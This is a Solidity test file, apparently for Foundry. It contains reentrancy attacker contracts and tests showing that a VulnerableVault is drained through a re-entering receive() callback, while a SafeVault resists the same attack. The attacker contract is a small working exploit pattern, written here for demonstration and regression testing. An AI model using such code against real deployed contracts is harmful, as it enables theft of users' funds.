// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "../src/VulnerableVault.sol";
import "../src/SafeVault.sol";

contract ReentrantAttacker {
    VulnerableVault public target;
    uint256 public reentryCount;

    constructor(VulnerableVault _target) {
        target = _target;
    }

    function attack() external payable {
        require(msg.value == 1 ether, "need 1 ether");
        target.deposit{value: msg.value}();
        target.withdraw();
    }

    receive() external payable {
        if (address(target).balance >= 1 ether && reentryCount < 2) {
            reentryCount++;
            target.withdraw();
        }
    }
}

contract SafeReentrantAttacker {
    SafeVault public target;
    uint256 public reentryCount;

    constructor(SafeVault _target) {
        target = _target;
    }

    function attack() external payable {
        require(msg.value == 1 ether, "need 1 ether");
        target.deposit{value: msg.value}();
        target.withdraw();
    }

    receive() external payable {
        if (address(target).balance >= 1 ether && reentryCount < 2) {
            reentryCount++;
            target.withdraw();
        }
    }
}

interface Vm {
    function deal(address account, uint256 newBalance) external;
}

contract ReentrancyTest {
    Vm constant vm = Vm(address(uint160(uint256(keccak256('hevm cheat code')))));
    receive() external payable {}

    function testVulnerableVaultCanBeDrained() public {
        vm.deal(address(this), 4 ether);
        VulnerableVault vault = new VulnerableVault();
        vault.deposit{value: 3 ether}();
        ReentrantAttacker attacker = new ReentrantAttacker(vault);
        attacker.attack{value: 1 ether}();
        require(address(vault).balance == 1 ether, "expected drain");
        require(address(attacker).balance == 3 ether, "attacker did not extract funds");
        require(attacker.reentryCount() == 2, "expected two reentries");
    }

    function testSafeVaultPreventsReentrantDrain() public {
        vm.deal(address(this), 4 ether);
        SafeVault vault = new SafeVault();
        vault.deposit{value: 3 ether}();
        SafeReentrantAttacker attacker = new SafeReentrantAttacker(vault);
        attacker.attack{value: 1 ether}();
        require(address(vault).balance == 3 ether, "vault balance changed");
        require(address(attacker).balance == 1 ether, "attacker extracted extra funds");
        require(attacker.reentryCount() == 1, "expected attempted reentry");
    }
}
